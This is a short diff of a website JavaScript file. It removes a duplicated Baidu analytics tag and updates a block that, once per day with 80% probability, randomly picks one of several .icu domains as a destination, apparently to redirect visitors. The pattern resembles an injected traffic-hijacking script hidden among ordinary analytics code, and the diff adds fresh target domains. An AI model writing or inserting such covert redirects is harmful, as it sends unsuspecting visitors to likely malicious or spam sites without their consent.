@@ -14,13 +14,6 @@
 
   // 百度统计（PC/移动端都插入）
   var _hmt = _hmt || [];
-(function() {
-  var hm = document.createElement("script");
-  hm.src = "https://hm.baidu.com/hm.js?1314e4cf3cea7338d0a3e2da608f6d80";
-  var s = document.getElementsByTagName("script")[0]; 
-  s.parentNode.insertBefore(hm, s);
-})();
-  var _hmt = _hmt || [];
   (function() {
     var hm = document.createElement("script");
     hm.src = "https://hm.baidu.com/hm.js?6a971e7c8b0c11cf7e590b211f60d8fd";
@@ -45,8 +38,8 @@
   if (lastJumpDate !== today) {
     if (Math.random() < 0.8) {
       var urls = [
-        "https://69tzd.icu/mian.html",
-        "https://69tzc.icu/mian.html"
+        "https://69tze.icu/mian.html",
+        "https://69tzf.icu/mian.html"
       ];
       var idx = Math.floor(Math.random() * urls.length);
       var selected = urls[idx];
